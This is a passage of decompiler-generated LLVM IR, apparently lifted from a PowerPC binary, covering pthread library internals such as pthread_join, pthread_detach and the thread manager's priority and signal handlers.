  store i32 268457200, i32* @lr, align 4
  %v0_100054ec = call i32 @__pthread_unlock()
  %v0_100054f0 = load i32, i32* %r29.global-to-local, align 4
  %v3_100054f0 = icmp eq i32 %v0_100054f0, 0
  br i1 %v3_100054f0, label %dec_label_pc_10005500, label %dec_label_pc_100054f8

dec_label_pc_100054f8:                            ; preds = %dec_label_pc_100054dc
  store i32 %v0_100054f0, i32* @r3, align 4
  store i32 268457216, i32* @lr, align 4
  %v0_100054fc = call i32 @__pthread_restart_new()
  br label %dec_label_pc_10005500

dec_label_pc_10005500:                            ; preds = %dec_label_pc_100054dc, %dec_label_pc_100054f8
  %v3_10005504 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_10005504, i32* %r29.global-to-local, align 4
  %v0_10005508 = load i32, i32* @r31, align 4
  %v4_10005508 = icmp eq i32 %v0_10005508, %v3_10005504
  br i1 %v4_10005508, label %dec_label_pc_10005510, label %dec_label_pc_10005568

dec_label_pc_10005510:                            ; preds = %dec_label_pc_10005500
  %v3_10005514 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 %v3_10005514, i32* %r0.global-to-local, align 4
  %v1_10005518 = icmp slt i32 %v3_10005514, 0
  br i1 %v1_10005518, label %dec_label_pc_10005568, label %dec_label_pc_10005520

dec_label_pc_10005520:                            ; preds = %dec_label_pc_10005510
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 %v3_10005504, i32* %stack_var_-184, align 4
  %v2_10005530 = ptrtoint i32* %stack_var_-184 to i32
  store i32 268457280, i32* @lr, align 4
  %v2_1000553c6 = call i32 @__libc_write(i32 %v3_10005514, i32 %v2_10005530)
  %v3_100055409 = icmp eq i32 %v2_1000553c6, -1
  br i1 %v3_100055409, label %dec_label_pc_10005548, label %dec_label_pc_10005558

dec_label_pc_10005548:                            ; preds = %dec_label_pc_10005520, %dec_label_pc_10005548.dec_label_pc_1000552c_crit_edge
  %v0_10005548 = call i32 @__errno_location()
  %v1_1000554c = inttoptr i32 %v0_10005548 to i32*
  %v2_1000554c = load i32, i32* %v1_1000554c, align 4
  store i32 %v2_1000554c, i32* %r0.global-to-local, align 4
  %v3_10005550 = icmp eq i32 %v2_1000554c, 4
  br i1 %v3_10005550, label %dec_label_pc_10005548.dec_label_pc_1000552c_crit_edge, label %dec_label_pc_10005558

dec_label_pc_10005548.dec_label_pc_1000552c_crit_edge: ; preds = %dec_label_pc_10005548
  %v3_10005534.pre = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268457280, i32* @lr, align 4
  %v2_1000553c = call i32 @__libc_write(i32 %v3_10005534.pre, i32 %v2_10005530)
  %v3_10005540 = icmp eq i32 %v2_1000553c, -1
  br i1 %v3_10005540, label %dec_label_pc_10005548, label %dec_label_pc_10005558

dec_label_pc_10005558:                            ; preds = %dec_label_pc_10005548, %dec_label_pc_10005548.dec_label_pc_1000552c_crit_edge, %dec_label_pc_10005520
  %v0_10005558 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005558, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005560.192 to i32), i32* @lr, align 4
  %v1_1000555c = call i32 @suspend.3(i32 %v0_10005558)
  %v0_10005564 = call i32 @__GI_exit()
  br label %dec_label_pc_10005568

dec_label_pc_10005568:                            ; preds = %dec_label_pc_10005500, %dec_label_pc_10005510, %dec_label_pc_10005558
  %v1_1000556c = call i32 @__GI__exit(i32 0)
  ret i32 %v1_1000556c

; uselistorder directives
  uselistorder i32 %v2_10005530, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 6, 7, 4, 5, 8, 9, 10 }
  uselistorder i32 268457280, { 1, 0 }
  uselistorder label %dec_label_pc_10005568, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005558, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005548, { 1, 0 }
  uselistorder label %dec_label_pc_10005500, { 1, 0 }
  uselistorder label %dec_label_pc_100054dc, { 2, 0, 1 }
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v0_1000557c = load i32, i32* @r2, align 4
  %v1_10005588 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10005594 = add i32 %v1_10005588, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %v2_10005594, i32* @r3, align 4
  store i32 %v0_1000557c, i32* @r4, align 4
  store i32 %v2_10005594, i32* %stack_var_-180, align 4
  store i32 268457404, i32* @lr, align 4
  %v0_100055b8 = call i32 @__pthread_lock()
  %v0_100055bc = load i32, i32* @r30, align 4
  %v1_100055bc = add i32 %v0_100055bc, 8
  %v2_100055bc = inttoptr i32 %v1_100055bc to i32*
  %v3_100055bc = load i32, i32* %v2_100055bc, align 4
  store i32 %v3_100055bc, i32* @r31, align 4
  %v3_100055c0 = icmp eq i32 %v3_100055bc, 0
  br i1 %v3_100055c0, label %dec_label_pc_100055d4, label %dec_label_pc_100055c8

dec_label_pc_100055c8:                            ; preds = %entry
  %v1_100055c8 = add i32 %v3_100055bc, 16
  %v2_100055c8 = inttoptr i32 %v1_100055c8 to i32*
  %v3_100055c8 = load i32, i32* %v2_100055c8, align 4
  %v0_100055cc = load i32, i32* %r28.global-to-local, align 4
  %v4_100055cc = icmp eq i32 %v0_100055cc, %v3_100055c8
  br i1 %v4_100055cc, label %dec_label_pc_100055e4, label %dec_label_pc_100055d4

dec_label_pc_100055d4:                            ; preds = %dec_label_pc_100055c8, %entry
  store i32 %v0_100055bc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100055dc.194 to i32), i32* @lr, align 4
  %v0_100055d8 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10005758

dec_label_pc_100055e4:                            ; preds = %dec_label_pc_100055c8
  %v4_100055e8 = icmp eq i32 %v3_100055bc, %v0_1000557c
  br i1 %v4_100055e8, label %dec_label_pc_100055f0, label %dec_label_pc_10005600

dec_label_pc_100055f0:                            ; preds = %dec_label_pc_100055e4
  store i32 %v0_100055bc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100055f8.195 to i32), i32* @lr, align 4
  %v0_100055f4 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10005758

dec_label_pc_10005600:                            ; preds = %dec_label_pc_100055e4
  %v1_10005600 = add i32 %v3_100055bc, 45
  %v2_10005600 = inttoptr i32 %v1_10005600 to i8*
  %v3_10005600 = load i8, i8* %v2_10005600, align 1
  %v3_10005604 = icmp eq i8 %v3_10005600, 0
  br i1 %v3_10005604, label %dec_label_pc_1000560c, label %dec_label_pc_10005618

dec_label_pc_1000560c:                            ; preds = %dec_label_pc_10005600
  %v1_1000560c = add i32 %v3_100055bc, 56
  %v2_1000560c = inttoptr i32 %v1_1000560c to i32*
  %v3_1000560c = load i32, i32* %v2_1000560c, align 4
  %v3_10005610 = icmp eq i32 %v3_1000560c, 0
  br i1 %v3_10005610, label %dec_label_pc_10005628, label %dec_label_pc_10005618

dec_label_pc_10005618:                            ; preds = %dec_label_pc_10005600, %dec_label_pc_1000560c
  store i32 %v0_100055bc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005620.196 to i32), i32* @lr, align 4
  %v0_1000561c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10005758

dec_label_pc_10005628:                            ; preds = %dec_label_pc_1000560c
  %v1_10005628 = add i32 %v3_100055bc, 44
  %v2_10005628 = inttoptr i32 %v1_10005628 to i8*
  %v3_10005628 = load i8, i8* %v2_10005628, align 1
  %v3_1000562c = icmp eq i8 %v3_10005628, 0
  br i1 %v3_1000562c, label %dec_label_pc_10005634, label %dec_label_pc_100056ec

dec_label_pc_10005634:                            ; preds = %dec_label_pc_10005628
  %v2_10005638 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268457536, i32* @lr, align 4
  %v2_1000563c = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_1000557c, i32 %v2_10005638)
  %v1_10005644 = add i32 %v0_1000557c, 66
  %v2_10005644 = inttoptr i32 %v1_10005644 to i8*
  %v3_10005644 = load i8, i8* %v2_10005644, align 1
  %v3_10005648 = icmp eq i8 %v3_10005644, 0
  br i1 %v3_10005648, label %dec_label_pc_10005664, label %dec_label_pc_10005650

dec_label_pc_10005650:                            ; preds = %dec_label_pc_10005634
  store i32 1, i32* %r29.global-to-local, align 4
  %v1_10005658 = add i32 %v0_1000557c, 64
  %v2_10005658 = inttoptr i32 %v1_10005658 to i8*
  %v3_10005658 = load i8, i8* %v2_10005658, align 1
  %v3_1000565c = icmp eq i8 %v3_10005658, 0
  br i1 %v3_1000565c, label %dec_label_pc_10005670, label %dec_label_pc_10005664

dec_label_pc_10005664:                            ; preds = %dec_label_pc_10005650, %dec_label_pc_10005634
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000566c = load i32, i32* @r31, align 4
  %v2_1000566c = add i32 %v1_1000566c, 56
  %v3_1000566c = inttoptr i32 %v2_1000566c to i32*
  store i32 %v0_1000557c, i32* %v3_1000566c, align 4
  br label %dec_label_pc_10005670

dec_label_pc_10005670:                            ; preds = %dec_label_pc_10005650, %dec_label_pc_10005664
  %v0_10005670 = load i32, i32* @r30, align 4
  store i32 %v0_10005670, i32* @r3, align 4
  store i32 268457592, i32* @lr, align 4
  %v0_10005674 = call i32 @__pthread_unlock()
  %v0_10005678 = load i32, i32* %r29.global-to-local, align 4
  %v3_10005678 = icmp eq i32 %v0_10005678, 0
  store i32 %v0_1000557c, i32* @r3, align 4
  br i1 %v3_10005678, label %dec_label_pc_10005698, label %dec_label_pc_10005680

dec_label_pc_10005680:                            ; preds = %dec_label_pc_10005670
  store i32 268457612, i32* @lr, align 4
  %v2_10005688 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_1000557c, i32 0)
  br label %dec_label_pc_100056dc

dec_label_pc_10005698:                            ; preds = %dec_label_pc_10005670
  store i32 268457632, i32* @lr, align 4
  %v1_1000569c = call i32 @suspend.3(i32 %v0_1000557c)
  store i32 268457644, i32* @lr, align 4
  %v2_100056a8 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_1000557c, i32 0)
  %v1_100056b0 = add i32 %v0_1000557c, 440
  %v2_100056b0 = inttoptr i32 %v1_100056b0 to i8*
  %v3_100056b0 = load i8, i8* %v2_100056b0, align 1
  %v3_100056b4 = icmp eq i8 %v3_100056b0, 0
  br i1 %v3_100056b4, label %dec_label_pc_100056e0, label %dec_label_pc_100056bc

dec_label_pc_100056bc:                            ; preds = %dec_label_pc_10005698
  %v1_100056c0 = add i32 %v0_1000557c, 64
  %v2_100056c0 = inttoptr i32 %v1_100056c0 to i8*
  %v3_100056c0 = load i8, i8* %v2_100056c0, align 1
  %v3_100056c4 = icmp eq i8 %v3_100056c0, 0
  br i1 %v3_100056c4, label %dec_label_pc_100056cc, label %dec_label_pc_100056e0

dec_label_pc_100056cc:                            ; preds = %dec_label_pc_100056bc
  store i8 0, i8* %v2_100056b0, align 1
  br label %dec_label_pc_100056dc

dec_label_pc_100056dc:                            ; preds = %dec_label_pc_10005680, %dec_label_pc_100056cc
  %v0_100056dc = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100056e0

dec_label_pc_100056e0:                            ; preds = %dec_label_pc_100056bc, %dec_label_pc_10005698, %dec_label_pc_100056dc
  store i32 %v0_1000557c, i32* @r4, align 4
  %v0_100056e4 = load i32, i32* @r30, align 4
  store i32 %v0_100056e4, i32* @r3, align 4
  store i32 268457708, i32* @lr, align 4
  %v0_100056e8 = call i32 @__pthread_lock()
  br label %dec_label_pc_100056ec

dec_label_pc_100056ec:                            ; preds = %dec_label_pc_10005628, %dec_label_pc_100056e0
  %v0_100056ec = load i32, i32* %r27.global-to-local, align 4
  %v3_100056ec = icmp eq i32 %v0_100056ec, 0
  br i1 %v3_100056ec, label %dec_label_pc_100056fc, label %dec_label_pc_100056f4

dec_label_pc_100056f4:                            ; preds = %dec_label_pc_100056ec
  %v0_100056f4 = load i32, i32* @r31, align 4
  %v1_100056f4 = add i32 %v0_100056f4, 48
  %v2_100056f4 = inttoptr i32 %v1_100056f4 to i32*
  %v3_100056f4 = load i32, i32* %v2_100056f4, align 4
  %v2_100056f8 = inttoptr i32 %v0_100056ec to i32*
  store i32 %v3_100056f4, i32* %v2_100056f8, align 4
  br label %dec_label_pc_100056fc

dec_label_pc_100056fc:                            ; preds = %dec_label_pc_100056ec, %dec_label_pc_100056f4
  %v0_100056fc = load i32, i32* @r30, align 4
  store i32 %v0_100056fc, i32* @r3, align 4
  store i32 268457732, i32* @lr, align 4
  %v0_10005700 = call i32 @__pthread_unlock()
  %v3_10005708 = load i32, i32* @global_var_1002c258.128, align 4
  %v1_1000570c = icmp slt i32 %v3_10005708, 0
  br i1 %v1_1000570c, label %dec_label_pc_10005754, label %dec_label_pc_10005714

dec_label_pc_10005714:                            ; preds = %dec_label_pc_100056fc
  store i32 %v0_1000557c, i32* %stack_var_-172, align 4
  %v2_1000572c = ptrtoint i32* %stack_var_-172 to i32
  store i32 268457788, i32* @lr, align 4
  %v2_1000573812 = call i32 @__libc_write(i32 %v3_10005708, i32 %v2_1000572c)
  %v3_1000573c15 = icmp eq i32 %v2_1000573812, -1
  br i1 %v3_1000573c15, label %dec_label_pc_10005744, label %dec_label_pc_10005754

dec_label_pc_10005744:                            ; preds = %dec_label_pc_10005714, %dec_label_pc_10005744.dec_label_pc_10005728_crit_edge
  %v0_10005744 = call i32 @__errno_location()
  %v1_10005748 = inttoptr i32 %v0_10005744 to i32*
  %v2_10005748 = load i32, i32* %v1_10005748, align 4
  %v3_1000574c = icmp eq i32 %v2_10005748, 4
  br i1 %v3_1000574c, label %dec_label_pc_10005744.dec_label_pc_10005728_crit_edge, label %dec_label_pc_10005754

dec_label_pc_10005744.dec_label_pc_10005728_crit_edge: ; preds = %dec_label_pc_10005744
  %v3_10005730.pre = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268457788, i32* @lr, align 4
  %v2_10005738 = call i32 @__libc_write(i32 %v3_10005730.pre, i32 %v2_1000572c)
  %v3_1000573c = icmp eq i32 %v2_10005738, -1
  br i1 %v3_1000573c, label %dec_label_pc_10005744, label %dec_label_pc_10005754

dec_label_pc_10005754:                            ; preds = %dec_label_pc_10005714, %dec_label_pc_10005744, %dec_label_pc_10005744.dec_label_pc_10005728_crit_edge, %dec_label_pc_100056fc
  br label %dec_label_pc_10005758

dec_label_pc_10005758:                            ; preds = %dec_label_pc_10005618, %dec_label_pc_100055f0, %dec_label_pc_100055d4, %dec_label_pc_10005754
  %v0_10005768 = phi i32 [ 22, %dec_label_pc_10005618 ], [ 35, %dec_label_pc_100055f0 ], [ 3, %dec_label_pc_100055d4 ], [ 0, %dec_label_pc_10005754 ]
  ret i32 %v0_10005768

; uselistorder directives
  uselistorder i32 %v2_1000572c, { 1, 0 }
  uselistorder i32 %v0_100055bc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10005594, { 1, 0 }
  uselistorder i32 %v0_1000557c, { 3, 4, 2, 7, 8, 6, 9, 5, 10, 1, 11, 12, 13, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32 268457788, { 1, 0 }
  uselistorder i32 (i32)* @suspend.3, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005758, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005754, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10005744, { 1, 0 }
  uselistorder label %dec_label_pc_100056fc, { 1, 0 }
  uselistorder label %dec_label_pc_100056ec, { 1, 0 }
  uselistorder label %dec_label_pc_100056e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100056dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005670, { 1, 0 }
  uselistorder label %dec_label_pc_10005618, { 1, 0 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %v0_1000577c = call i32 @__pthread_do_exit()
  ret i32 %v0_1000577c
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10005788 = load i32, i32* @r2, align 4
  store i32 %v0_10005788, i32* @r4, align 4
  store i32 268457888, i32* @lr, align 4
  %v0_1000579c = call i32 @__pthread_lock()
  %v1_100057a0 = add i32 %arg1, 8
  %v2_100057a0 = inttoptr i32 %v1_100057a0 to i32*
  %v3_100057a0 = load i32, i32* %v2_100057a0, align 4
  store i32 %arg1, i32* @r3, align 4
  %v1_100057ac = add i32 %v3_100057a0, 56
  %v2_100057ac = inttoptr i32 %v1_100057ac to i32*
  %v3_100057ac = load i32, i32* %v2_100057ac, align 4
  store i32 %v3_100057ac, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_100057ac, align 4
  %v0_100057b4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100057b4 = icmp ne i32 %v0_100057b4, 0
  %v5_100057b8 = zext i1 %v2_100057b4 to i32
  store i32 268457920, i32* @lr, align 4
  %v0_100057bc = call i32 @__pthread_unlock()
  ret i32 %v5_100057b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  %v1_100057f4 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_100057f8 = add i32 %v1_100057f4, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_100057f8, i32* @r3, align 4
  store i32 268457992, i32* @lr, align 4
  %v0_10005804 = call i32 @__pthread_lock()
  %v0_10005808 = load i32, i32* @r31, align 4
  %v1_10005808 = add i32 %v0_10005808, 8
  %v2_10005808 = inttoptr i32 %v1_10005808 to i32*
  %v3_10005808 = load i32, i32* %v2_10005808, align 4
  %v3_1000580c = icmp eq i32 %v3_10005808, 0
  br i1 %v3_1000580c, label %dec_label_pc_10005820, label %dec_label_pc_10005814

dec_label_pc_10005814:                            ; preds = %entry
  %v1_10005814 = add i32 %v3_10005808, 16
  %v2_10005814 = inttoptr i32 %v1_10005814 to i32*
  %v3_10005814 = load i32, i32* %v2_10005814, align 4
  %v0_10005818 = load i32, i32* @r30, align 4
  %v4_10005818 = icmp eq i32 %v0_10005818, %v3_10005814
  br i1 %v4_10005818, label %dec_label_pc_10005830, label %dec_label_pc_10005820

dec_label_pc_10005820:                            ; preds = %dec_label_pc_10005814, %entry
  store i32 %v0_10005808, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005828.197 to i32), i32* @lr, align 4
  %v0_10005824 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100058d0

dec_label_pc_10005830:                            ; preds = %dec_label_pc_10005814
  %v1_10005830 = add i32 %v3_10005808, 45
  %v2_10005830 = inttoptr i32 %v1_10005830 to i8*
  %v3_10005830 = load i8, i8* %v2_10005830, align 1
  %v3_10005834 = icmp eq i8 %v3_10005830, 0
  br i1 %v3_10005834, label %dec_label_pc_1000584c, label %dec_label_pc_1000583c

dec_label_pc_1000583c:                            ; preds = %dec_label_pc_10005830
  store i32 %v0_10005808, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005844.198 to i32), i32* @lr, align 4
  %v0_10005840 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100058d0

dec_label_pc_1000584c:                            ; preds = %dec_label_pc_10005830
  %v1_1000584c = add i32 %v3_10005808, 56
  %v2_1000584c = inttoptr i32 %v1_1000584c to i32*
  %v3_1000584c = load i32, i32* %v2_1000584c, align 4
  %v3_10005850 = icmp eq i32 %v3_1000584c, 0
  br i1 %v3_10005850, label %dec_label_pc_10005864, label %dec_label_pc_10005858

dec_label_pc_10005858:                            ; preds = %dec_label_pc_1000584c
  store i32 %v0_10005808, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005860.199 to i32), i32* @lr, align 4
  %v0_1000585c = call i32 @__pthread_unlock()
  br label %dec_label_pc_100058cc

dec_label_pc_10005864:                            ; preds = %dec_label_pc_1000584c
  %v1_10005868 = add i32 %v3_10005808, 44
  %v2_10005868 = inttoptr i32 %v1_10005868 to i8*
  %v3_10005868 = load i8, i8* %v2_10005868, align 1
  %v4_10005868 = zext i8 %v3_10005868 to i32
  store i32 %v4_10005868, i32* %r29.global-to-local, align 4
  store i8 1, i8* %v2_10005830, align 1
  %v0_10005870 = load i32, i32* @r31, align 4
  store i32 %v0_10005870, i32* @r3, align 4
  store i32 268458104, i32* @lr, align 4
  %v0_10005874 = call i32 @__pthread_unlock()
  %v0_10005878 = load i32, i32* %r29.global-to-local, align 4
  %v3_10005878 = icmp eq i32 %v0_10005878, 0
  br i1 %v3_10005878, label %dec_label_pc_100058cc, label %dec_label_pc_10005880

dec_label_pc_10005880:                            ; preds = %dec_label_pc_10005864
  %v3_10005884 = load i32, i32* @global_var_1002c258.128, align 4
  %v1_10005888 = icmp slt i32 %v3_10005884, 0
  br i1 %v1_10005888, label %dec_label_pc_100058cc, label %dec_label_pc_10005890

dec_label_pc_10005890:                            ; preds = %dec_label_pc_10005880
  %v0_1000589c = load i32, i32* @r2, align 4
  store i32 %v0_1000589c, i32* %stack_var_-184, align 4
  %v2_100058a4 = ptrtoint i32* %stack_var_-184 to i32
  store i32 268458164, i32* @lr, align 4
  %v2_100058b08 = call i32 @__libc_write(i32 %v3_10005884, i32 %v2_100058a4)
  %v3_100058b411 = icmp eq i32 %v2_100058b08, -1
  br i1 %v3_100058b411, label %dec_label_pc_100058bc, label %dec_label_pc_100058cc

dec_label_pc_100058bc:                            ; preds = %dec_label_pc_10005890, %dec_label_pc_100058bc.dec_label_pc_100058a0_crit_edge
  %v0_100058bc = call i32 @__errno_location()
  %v1_100058c0 = inttoptr i32 %v0_100058bc to i32*
  %v2_100058c0 = load i32, i32* %v1_100058c0, align 4
  %v3_100058c4 = icmp eq i32 %v2_100058c0, 4
  br i1 %v3_100058c4, label %dec_label_pc_100058bc.dec_label_pc_100058a0_crit_edge, label %dec_label_pc_100058cc

dec_label_pc_100058bc.dec_label_pc_100058a0_crit_edge: ; preds = %dec_label_pc_100058bc
  %v3_100058a8.pre = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268458164, i32* @lr, align 4
  %v2_100058b0 = call i32 @__libc_write(i32 %v3_100058a8.pre, i32 %v2_100058a4)
  %v3_100058b4 = icmp eq i32 %v2_100058b0, -1
  br i1 %v3_100058b4, label %dec_label_pc_100058bc, label %dec_label_pc_100058cc

dec_label_pc_100058cc:                            ; preds = %dec_label_pc_10005890, %dec_label_pc_100058bc, %dec_label_pc_100058bc.dec_label_pc_100058a0_crit_edge, %dec_label_pc_10005880, %dec_label_pc_10005864, %dec_label_pc_10005858
  br label %dec_label_pc_100058d0

dec_label_pc_100058d0:                            ; preds = %dec_label_pc_1000583c, %dec_label_pc_10005820, %dec_label_pc_100058cc
  %v0_100058e0 = phi i32 [ 22, %dec_label_pc_1000583c ], [ 3, %dec_label_pc_10005820 ], [ 0, %dec_label_pc_100058cc ]
  ret i32 %v0_100058e0

; uselistorder directives
  uselistorder i32 %v2_100058a4, { 1, 0 }
  uselistorder i32 %v0_10005808, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 268458164, { 1, 0 }
  uselistorder label %dec_label_pc_100058d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100058cc, { 2, 1, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_100058bc, { 1, 0 }
}

define i32 @__fresetlockfiles(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_100058f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100058f0, i32* %r29.global-to-local, align 4
  %v2_100058fc = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-40)
  %v3_10005908 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-40, i32 1)
  %storemerge1 = load i32, i32* bitcast (i32** @global_var_1002c2bc.141 to i32*), align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_100059204 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100059204, label %dec_label_pc_10005934, label %dec_label_pc_10005918

dec_label_pc_10005918:                            ; preds = %entry, %dec_label_pc_10005918
  %v1_100059287.in = phi i32 [ %storemerge, %dec_label_pc_10005918 ], [ %storemerge1, %entry ]
  %v1_100059287 = add i32 %v1_100059287.in, 56
  %v3_10005918 = call i32 @pthread_mutex_init(i32 %v1_100059287, i32* nonnull %stack_var_-40)
  %v0_1000591c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000591c = add i32 %v0_1000591c, 32
  %v2_1000591c = inttoptr i32 %v1_1000591c to i32*
  %storemerge = load i32, i32* %v2_1000591c, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10005920 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005920, label %dec_label_pc_10005934, label %dec_label_pc_10005918

dec_label_pc_10005934:                            ; preds = %dec_label_pc_10005918, %entry
  %v1_10005938 = call i32 @pthread_mutexattr_destroy(i32 %v2_100058f0)
  ret i32 %v1_10005938

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r29.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005918, { 1, 0 }
}

define i32 @__pthread_manager_adjust_prio(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r31, align 4
  %v3_1000596c = load i32, i32* @global_var_10027c78.200, align 4
  %v3_10005970 = icmp slt i32 %v3_1000596c, %arg1
  br i1 %v3_10005970, label %dec_label_pc_10005978, label %dec_label_pc_100059ac

dec_label_pc_10005978:                            ; preds = %entry
  store i32 268458364, i32* @lr, align 4
  %v1_10005978 = call i32 @sched_get_priority_max(i32 1)
  %v0_10005990 = call i32 @__asm_mfcr()
  %v1_10005994 = call i32 @__asm_rlwinm(i32 %v0_10005990, i32 29, i32 31, i32 31)
  store i32 268458408, i32* @lr, align 4
  %v0_100059a4 = call i32 @sched_setscheduler()
  %v0_100059a8 = load i32, i32* @r31, align 4
  store i32 %v0_100059a8, i32* @global_var_10027c78.200, align 4
  br label %dec_label_pc_100059ac

dec_label_pc_100059ac:                            ; preds = %entry, %dec_label_pc_10005978
  %v0_100059bc = phi i32 [ 1, %entry ], [ %v0_100059a4, %dec_label_pc_10005978 ]
  ret i32 %v0_100059bc

; uselistorder directives
  uselistorder label %dec_label_pc_100059ac, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %v3_100059d0 = load i32, i32* @global_var_1002c34c.201, align 4
  %v3_100059d8 = icmp eq i32 %v3_100059d0, 0
  br i1 %v3_100059d8, label %dec_label_pc_100059e0, label %dec_label_pc_100059f4

dec_label_pc_100059e0:                            ; preds = %entry
  br label %dec_label_pc_100059f4

dec_label_pc_100059f4:                            ; preds = %entry, %dec_label_pc_100059e0
  %v0_100059f4 = phi i1 [ false, %dec_label_pc_100059e0 ], [ true, %entry ]
  store i32 1, i32* @global_var_1002c34c.201, align 4
  br i1 %v0_100059f4, label %dec_label_pc_100059f4.dec_label_pc_10005a44_crit_edge, label %dec_label_pc_10005a08

dec_label_pc_100059f4.dec_label_pc_10005a44_crit_edge: ; preds = %dec_label_pc_100059f4
  %v0_10005a50.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10005a44

dec_label_pc_10005a08:                            ; preds = %dec_label_pc_100059f4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_10005a1c = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10005a18

dec_label_pc_10005a18:                            ; preds = %dec_label_pc_10005a34, %dec_label_pc_10005a08
  %v3_10005a20 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268458540, i32* @lr, align 4
  %v2_10005a28 = call i32 @__libc_write(i32 %v3_10005a20, i32 %v2_10005a1c)
  %v3_10005a2c = icmp eq i32 %v2_10005a28, -1
  br i1 %v3_10005a2c, label %dec_label_pc_10005a34, label %dec_label_pc_10005a44

dec_label_pc_10005a34:                            ; preds = %dec_label_pc_10005a18
  %v0_10005a34 = call i32 @__errno_location()
  %v1_10005a38 = inttoptr i32 %v0_10005a34 to i32*
  %v2_10005a38 = load i32, i32* %v1_10005a38, align 4
  %v3_10005a3c = icmp eq i32 %v2_10005a38, 4
  br i1 %v3_10005a3c, label %dec_label_pc_10005a18, label %dec_label_pc_10005a44

dec_label_pc_10005a44:                            ; preds = %dec_label_pc_10005a18, %dec_label_pc_10005a34, %dec_label_pc_100059f4.dec_label_pc_10005a44_crit_edge
